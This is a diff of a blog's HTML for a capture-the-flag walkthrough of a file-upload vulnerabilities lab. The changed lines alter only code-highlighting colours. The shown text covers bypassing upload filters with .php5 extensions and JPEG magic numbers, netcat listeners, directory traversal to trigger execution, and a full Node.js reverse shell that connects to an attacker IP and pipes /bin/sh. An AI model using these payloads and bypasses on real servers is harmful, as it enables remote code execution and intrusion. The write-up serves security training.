+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -u annex.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gb-annex
 </span></span></code></pre></div><p>The scan enumerates the following directories:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>1. /privacy <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 332<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://annex.uploadvulns.thm/privacy/<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>2. /assets <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 331<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://annex.uploadvulns.thm/assets/<span style="color:#000">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>1. /privacy <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 332<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://annex.uploadvulns.thm/privacy/<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>2. /assets <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 331<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://annex.uploadvulns.thm/assets/<span style="color:#ff79c6">]</span>
 </span></span></code></pre></div><p>While the <code>/assets</code> directory does not contain our uploaded image file, <code>/privacy</code> does. We note here that the filename has been modified to include date and time information before the existing name:</p>
 <p><img src="/images/uv/anx-assets.png" alt="anx-assets"></p>
 <p>From here, we try to upload our reverse shell script directly, but are given this error message, as our payload was filtered by the server.</p>
@@ -936,7 +936,7 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p>While we receive <code>File type is invalid</code> responses for 8 of the 9 files listed above, <code>ptm-shell.php5</code> makes it through the server&rsquo;s filter and into the <code>/privacy</code> directory.</p>
 <p><img src="/images/uv/anx-php5.png" alt="anx-php5"></p>
 <p>From here we simply invoke our <code>netcat</code> listener on our attack machine with:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#1c01ce">4444</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#bd93f9">4444</span>
 </span></span></code></pre></div><p>and then run the script by visiting the file&rsquo;s location in our browser.</p>
 <p><img src="/images/uv/anx-solution.png" alt="anx-solution"></p>
 <h2 id="task-9---bypassing-server-side-filtering-magic-numbers">Task 9 - Bypassing Server-Side Filtering: Magic Numbers</h2>
@@ -946,7 +946,7 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p>This task&rsquo;s walkthrough begins again with a webpage housing a file upload form. As is expected, <code>.php</code> files are caught in the server&rsquo;s filter, while <code>.jpeg</code> images are not.</p>
 <p>As we know that <code>.jpeg</code> files are permitted by the filter, we should be able to add the &ldquo;magic numbers&rdquo; <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">that correspond to this file type</a> to the top of our <code>.php</code> script. To do so, we first add 4 conventional characters (it does not matter which) to the top of our <code>ptm-shell.php</code> script.</p>
 <p>Next, we open the file in <code>hexeditor</code> (or an equivalent application) and change the conventional characters to <code>FF D8 FF DB</code> - the magic numbers for <code>.jpeg</code> format files. To check that this has been done properly, run:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>file ptm-shell.php
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>file ptm-shell.php
 </span></span></code></pre></div><p>This should return <code>ptm-shell.php: JPEG image data</code>.</p>
 <p>We are then able to upload our <code>.php</code> reverse shell script, now disguised as a <code>.jpeg</code> image, to the server and execute it.</p>
 <p>Before being given the challenge associated with this task, we are warned that directory indexing has been disabled on the target server.</p>
@@ -1023,24 +1023,24 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p><img src="/images/uv/jewel-wap.png" alt="jewel-wap"></p>
 <p>From this, we learn that this site is running <a href="https://expressjs.com/">Express</a>, a <code>Node.js</code> web application framework. This means that our <code>ptm-shell.php</code> reverse shell script will almost certainly not work, as the server is configured to run <code>JavaScript</code> code.</p>
 <p>Luckily for us, the PayloadsAllTheThings <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs">Reverse Shell Cheat Sheet repository</a> on GitHub includes a reverse shell script for use with <code>Node.js</code>. Here it is:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>(<span style="color:#a90d91">function</span>(){
-</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">var</span> <span style="color:#000">net</span> <span style="color:#000">=</span> <span style="color:#000">require</span>(<span style="color:#c41a16">&#34;net&#34;</span>),
-</span></span><span style="display:flex;"><span>        <span style="color:#000">cp</span> <span style="color:#000">=</span> <span style="color:#000">require</span>(<span style="color:#c41a16">&#34;child_process&#34;</span>),
-</span></span><span style="display:flex;"><span>        <span style="color:#000">sh</span> <span style="color:#000">=</span> <span style="color:#000">cp</span>.<span style="color:#000">spawn</span>(<span style="color:#c41a16">&#34;/bin/sh&#34;</span>, []);
-</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">var</span> <span style="color:#000">client</span> <span style="color:#000">=</span> <span style="color:#a90d91">new</span> <span style="color:#000">net</span>.<span style="color:#000">Socket</span>();
-</span></span><span style="display:flex;"><span>    <span style="color:#000">client</span>.<span style="color:#000">connect</span>(<span style="color:#1c01ce">4242</span>, <span style="color:#c41a16">&#34;10.0.0.1&#34;</span>, <span style="color:#a90d91">function</span>(){
-</span></span><span style="display:flex;"><span>        <span style="color:#000">client</span>.<span style="color:#000">pipe</span>(<span style="color:#000">sh</span>.<span style="color:#000">stdin</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#000">sh</span>.<span style="color:#000">stdout</span>.<span style="color:#000">pipe</span>(<span style="color:#000">client</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#000">sh</span>.<span style="color:#000">stderr</span>.<span style="color:#000">pipe</span>(<span style="color:#000">client</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>(<span style="color:#8be9fd;font-style:italic">function</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">var</span> net <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;net&#34;</span>),
+</span></span><span style="display:flex;"><span>        cp <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;child_process&#34;</span>),
+</span></span><span style="display:flex;"><span>        sh <span style="color:#ff79c6">=</span> cp.spawn(<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>, []);
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">var</span> client <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> net.Socket();
+</span></span><span style="display:flex;"><span>    client.connect(<span style="color:#bd93f9">4242</span>, <span style="color:#f1fa8c">&#34;10.0.0.1&#34;</span>, <span style="color:#8be9fd;font-style:italic">function</span>(){
+</span></span><span style="display:flex;"><span>        client.pipe(sh.stdin);
+</span></span><span style="display:flex;"><span>        sh.stdout.pipe(client);
+</span></span><span style="display:flex;"><span>        sh.stderr.pipe(client);
 </span></span><span style="display:flex;"><span>    });
-</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">return</span> <span style="color:#c41a16">/a/</span>; <span style="color:#177500">// Prevents the Node.js application from crashing
-</span></span></span><span style="display:flex;"><span><span style="color:#177500"></span>})();
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">/a/</span>; <span style="color:#6272a4">// Prevents the Node.js application from crashing
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>})();
 </span></span></code></pre></div><p>After configuring the port and IP address above to match those of our attack machine, we can save this as <code>njs-shell.js</code> to use a bit later.</p>
 <h3 id="identifying-vulnerabilities">Identifying vulnerabilities</h3>
 <p>For more information, we can inspect the source code of the page, which includes a <code>.js</code> script called <code>/upload.js</code> that uses the following filtering scheme:</p>
 <p><img src="/images/uv/jewel-uploadjs.png" alt="jewel-uploadjs"></p>
 <p>Also, note this line in the source code of the home page:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#000">input</span> <span style="color:#836c28">id</span><span style="color:#000">=</span><span style="color:#c41a16">&#34;fileSelect&#34;</span> <span style="color:#836c28">type</span><span style="color:#000">=</span><span style="color:#c41a16">&#34;file&#34;</span> <span style="color:#836c28">name</span><span style="color:#000">=</span><span style="color:#c41a16">&#34;fileToUpload&#34;</span> <span style="color:#836c28">accept</span><span style="color:#000">=</span><span style="color:#c41a16">&#34;image/jpeg&#34;</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;fileSelect&#34;</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;file&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;fileToUpload&#34;</span> <span style="color:#50fa7b">accept</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;image/jpeg&#34;</span>&gt;
 </span></span></code></pre></div><p>We can deduce, from the above code, that the server:</p>
 <ul>
 <li>Has a size/length limit in place</li>
@@ -1080,7 +1080,7 @@ we need to figure out how to get our <code>njs-shell.js</code> reverse shell pas
 <p>In order to confirm our success, we can run another <code>gobuster</code> scan, which confirms the existence of <code>LED.jpg</code> in the <code>/content</code> directory.</p>
 <p><img src="/images/uv/jewel-jsjpg-upload.png" alt="jewel-jsjpg-upload"></p>
 <p>To activate our reverse shell and achieve RCE, we&rsquo;ll need to remember to enable our <code>netcat</code> listener with:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#1c01ce">4444</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#bd93f9">4444</span>
 </span></span></code></pre></div><p>Now we can navigate to the secret admin page that we identified at <code>http://jewel.uploadvulns.thm/admin</code> and determine how to activate our reverse shell via <code>http://jewel.uploadvulns.thm/content/LED.jpg</code>. The placeholder text of the form field tells us that we can input the location of files to execute from the <code>/modules</code> directory. From our previous More Enumeration efforts, we know that the <code>/content</code> directory sits adjacent to <code>/modules</code> under the root level of the server&rsquo;s filesystem. Thus, unless actively prohibited, we can use <code>../</code> to traverse directories. This means that by entering <code>../content/LED.jpg</code>, we should be able to activate our reverse shell script.</p>
 <p><img src="/images/uv/jewel-led-rce.png" alt="jewel-led-rce"></p>
 <p><em>et voilà!</em></p>
